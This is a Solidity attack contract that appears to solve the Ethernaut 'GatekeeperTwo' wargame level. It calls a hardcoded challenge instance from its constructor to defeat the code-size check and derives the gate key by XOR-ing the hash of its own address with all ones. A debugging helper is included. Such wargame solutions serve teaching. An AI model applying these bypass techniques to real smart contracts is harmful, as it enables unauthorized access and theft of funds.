// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {

    GatekeeperTwo private challenge = 
        GatekeeperTwo(0xaD165f31717aE28CceD4cbcD401b15A6DBd05E93);

    constructor() {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));
        challenge.enter{gas:50000}(key);
    }

    function show() public view returns (
        uint, uint64, uint64, uint64
    ) {
        // This should always be zero (0).
        uint x;
        assembly { x := extcodesize(caller()) }

        // require(
            // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ 
            // uint64(_gateKey) == uint64(0) - 1);
        // bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));
        
        uint64 sender = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 _gateKey = bytes8(sender + 2 ** 32);
        uint64 y = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey);

        return (
            x, y, 
            sender,
            uint64(0) - 1
        );
    }

    function attack() public {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));
        challenge.enter{gas:50000}(key);
    }
}